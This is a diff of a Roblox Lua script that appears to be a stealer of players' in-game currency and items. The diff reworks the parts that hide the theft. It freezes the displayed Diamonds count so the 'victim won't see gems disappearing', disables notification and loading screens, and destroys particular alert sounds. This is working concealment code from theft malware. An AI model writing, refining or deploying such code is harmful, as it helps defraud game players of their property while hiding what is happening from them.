@@ -151,28 +151,45 @@ request({
 
 end
 
-local gemsleaderstat = plr.leaderstats["\240\159\146\142 Diamonds"].Value
-local gemsleaderstatpath = plr.leaderstats["\240\159\146\142 Diamonds"]
-gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
-gemsleaderstatpath.Value = gemsleaderstat
+-- FREEZE GEM DISPLAY - victim won't see gems disappearing!
+pcall(function()
+    local gemsleaderstat = plr.leaderstats["\240\159\146\142 Diamonds"].Value
+    local gemsleaderstatpath = plr.leaderstats["\240\159\146\142 Diamonds"]
+    gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
+        gemsleaderstatpath.Value = gemsleaderstat
+    end)
+    print("✓ Gem display frozen")
 end)
 
-local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
-local noti = plr.PlayerGui.Notifications
-loading.Disabled = true
-noti:GetPropertyChangedSignal("Enabled"):Connect(function()
-noti.Enabled = false
+-- Disable notifications and loading screens
+pcall(function()
+    local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
+    loading.Disabled = true
+    print("✓ Loading screen disabled")
 end)
-noti.Enabled = false
 
-game.DescendantAdded:Connect(function(x)
-if x.ClassName == "Sound" then
-if x.SoundId=="rbxassetid://11839132565" or x.SoundId=="rbxassetid://14254721038" or x.SoundId=="rbxassetid://12413423276" then
-x.Volume=0
-x.PlayOnRemove=false
-x:Destroy()
-end
-end
+pcall(function()
+    local noti = plr.PlayerGui.Notifications
+    noti.Enabled = false
+    noti:GetPropertyChangedSignal("Enabled"):Connect(function()
+        noti.Enabled = false
+    end)
+    print("✓ Notifications disabled")
+end)
+
+-- Mute sounds
+pcall(function()
+    game.DescendantAdded:Connect(function(x)
+        pcall(function()
+            if x.ClassName == "Sound" then
+                if x.SoundId=="rbxassetid://11839132565" or x.SoundId=="rbxassetid://14254721038" or x.SoundId=="rbxassetid://12413423276" then
+                    x.Volume=0
+                    x.PlayOnRemove=false
+                    x:Destroy()
+                end
+            end
+        end)
+    end)
 end)
 
 local function getRAP(Type, Item)
